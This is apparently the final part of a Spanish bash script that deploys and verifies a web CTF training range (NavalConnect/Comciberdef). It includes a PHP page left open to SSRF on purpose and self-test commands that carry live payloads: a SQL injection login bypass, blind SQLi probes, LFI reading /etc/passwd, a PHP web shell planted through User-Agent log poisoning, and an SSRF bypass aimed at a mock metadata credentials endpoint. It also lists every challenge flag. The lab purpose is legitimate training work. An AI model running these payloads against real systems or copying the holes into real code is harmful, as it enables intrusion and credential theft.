    if(isset($_GET['headers'])&&is_array($_GET['headers'])){
        $hdr=[];foreach($_GET['headers'] as $k=>$v){$hdr[]=htmlspecialchars_decode($k).': '.htmlspecialchars_decode($v);}
        curl_setopt($ch,CURLOPT_HTTPHEADER,$hdr);}
    $result=curl_exec($ch);$http_code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
    $curl_err=curl_error($ch);curl_close($ch);
    if($result!==false&&$http_code>0){$success=true;}else{$error=$curl_err?:'No se pudo conectar.';}
}elseif($blocked){$error='Acceso denegado: direccion IP interna bloqueada.';}
else{$error='URL no valida.';}
?><!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>NavalConnect — Vista Previa</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f172a;color:#e2e8f0;font-family:sans-serif;min-height:100vh}
header{background:#1e293b;border-bottom:1px solid #334155;padding:16px 36px;display:flex;align-items:center;gap:14px}
header h1{font-size:20px;color:#38bdf8;font-weight:700}header a{margin-left:auto;color:#64748b;font-size:13px;text-decoration:none}
.container{max-width:820px;margin:40px auto;padding:0 24px}
.card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:28px}
.url-bar{font-size:12px;color:#64748b;margin-bottom:20px;background:#0f172a;padding:10px 14px;border-radius:6px;font-family:monospace;word-break:break-all}
.result{background:#0f172a;border:1px solid #1e40af;border-radius:8px;padding:20px;font-family:monospace;font-size:13px;color:#93c5fd;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto;line-height:1.6}
.error{background:#1e1414;border:1px solid #7f1d1d;border-radius:8px;padding:20px;color:#fca5a5;font-size:14px}
.ok{color:#34d399;font-size:13px;margin-bottom:14px}.err{color:#f87171;font-size:13px;margin-bottom:14px}
.hint{background:#1e2d1e;border:1px solid #166534;border-radius:8px;padding:14px 18px;font-size:12px;color:#86efac;margin-top:20px}
.back{display:inline-block;margin-top:20px;color:#38bdf8;font-size:13px;text-decoration:none}</style>
</head><body>
<header><h1>&#127758; NavalConnect — Vista Previa</h1><a href="index.php">&#8592; Volver</a></header>
<div class="container"><div class="card">
<div class="url-bar">URL: <?=htmlspecialchars($url)?></div>
<?php if($success): ?>
<div class="ok">&#10003; Recurso obtenido</div>
<div class="result"><?=htmlspecialchars($result)?></div>
<?php if($http_code===401): ?>
<div class="hint"><strong>Tip:</strong> Recurso protegido. Usa:<br><code>?url=...&amp;headers[Authorization]=Bearer+TOKEN</code></div>
<?php endif; ?>
<?php else: ?>
<div class="err">&#10007; Error</div><div class="error"><?=htmlspecialchars($error)?></div>
<?php endif; ?>
<a class="back" href="index.php">&#8592; Nueva previsualizacion</a>
</div></div></body></html>
PHPEOF

chown -R www-data:www-data /var/www/html/ssrf
chmod -R 750 /var/www/html/ssrf
echo -e "${VERDE}    [OK] Reto 5 desplegado${RESET}"

# =============================================================================
# PASO 9 — REINICIAR APACHE Y VALIDACIÓN FINAL
# =============================================================================
echo -e "${AMARILLO}[9/9] Reiniciando Apache y validando...${RESET}"
systemctl restart apache2
sleep 2

echo ""
echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║               VALIDACIÓN FINAL — 24 CONTROLES               ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }
chk_http() {
    local C; C=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$C" = "$3" ] && ok "$1 (HTTP $C)" || fail "$1 (esperado $3, got $C)"
}
chk_body() {
    local B; B=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$B" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── R1: SQLi Login ──────────────────────────────────${RESET}"
chk_http "Portal accesible"    "http://localhost/sqli-login/"  "200"
ROWS=$(mysql -u root -e "SELECT COUNT(*) FROM sqli_db.users;" -sN 2>/dev/null || echo 0)
[ "$ROWS" -eq 5 ] && ok "sqli_db.users: $ROWS filas" || fail "sqli_db.users: $ROWS filas"
B=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null)
echo "$B" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && ok "Bypass SQLi → flag" || fail "Bypass SQLi → flag"

echo ""
echo -e "${AMARILLO}── R2: XSS Reflejado ───────────────────────────────${RESET}"
chk_http "Portal /xss/ accesible" "http://localhost/xss/"  "200"
chk_body "search.php refleja input" "http://localhost/xss/search.php?query=CTF2026TEST" "CTF2026TEST"
HDRS=$(curl -sI "http://localhost/xss/search.php?query=x" 2>/dev/null || echo "")
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && ok "Cookie flag presente" || fail "Cookie flag ausente"

echo ""
echo -e "${AMARILLO}── R3: SQLi Ciega ───────────────────────────────────${RESET}"
chk_http "Portal accesible"    "http://localhost/sqli-blind/"  "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"
HASH=$(mysql -u root -e "SELECT password_hash FROM blind_db.moderators WHERE username='paco_admin';" -sN 2>/dev/null || echo X)
EXP=$(echo -n "NavalCiber2026" | md5sum | cut -d' ' -f1)
[ "$HASH" = "$EXP" ] && ok "Hash MD5 paco_admin correcto" || fail "Hash MD5 incorrecto ($HASH)"
grep -q "NavalCiber2026" /home/rangeadmin/wordlist.txt 2>/dev/null && ok "Wordlist contiene contraseña" || fail "Wordlist incompleta"

echo ""
echo -e "${AMARILLO}── R4: LFI + Log Poisoning ──────────────────────────${RESET}"
chk_http "Portal accesible"    "http://localhost/lfi/"  "200"
chk_body "LFI lee /etc/passwd" "http://localhost/lfi/?page=/etc/passwd" "root:x"
[ -f /var/log/app/access.log ] && ok "/var/log/app/access.log existe" || fail "Log no existe"
sudo -u www-data test -w /var/log/app/access.log 2>/dev/null && ok "Log escribible por www-data" || fail "Log no escribible"
[ -f /flag.txt ] && ok "/flag.txt existe" || fail "/flag.txt no existe"
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://localhost/lfi/?page=pages/home.php" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE lee /flag.txt" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" "Comciberdef"
printf '[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/ "Mozilla/5.0" 200\n' > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── R5: SSRF ─────────────────────────────────────────${RESET}"
[ "$(systemctl is-active ctf-metadata 2>/dev/null)" = "active" ] && ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
[ "$(systemctl is-active ctf-storage  2>/dev/null)" = "active" ] && ok "ctf-storage activo"  || fail "ctf-storage inactivo"
chk_http "Metadata :8888 accesible"     "http://127.0.0.1:8888/"                "200"
chk_http "Storage :9999 sin token→401"  "http://127.0.0.1:9999/secret/flag.txt" "401"
F=$(curl -s -H "Authorization: Bearer ${TOKEN_SSRF}" "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null)
echo "$F" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && ok "Storage entrega flag con token" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0 → token" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" "Token"
chk_http "Portal /ssrf/ accesible"      "http://localhost/ssrf/"                "200"

# RESUMEN
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles pasados\n${RESET}" "$PASS" "$TOTAL"
if [ "$FAIL" -eq 0 ]; then
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB DESPLEGADOS Y VERIFICADOS${RESET}"
else
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL controles fallaron${RESET}"
fi
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${NEGRITA}  URLs para participantes:${RESET}"
echo "  R1 → http://192.168.125.150/sqli-login/  │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150/xss/         │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/  │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/         │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/        │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
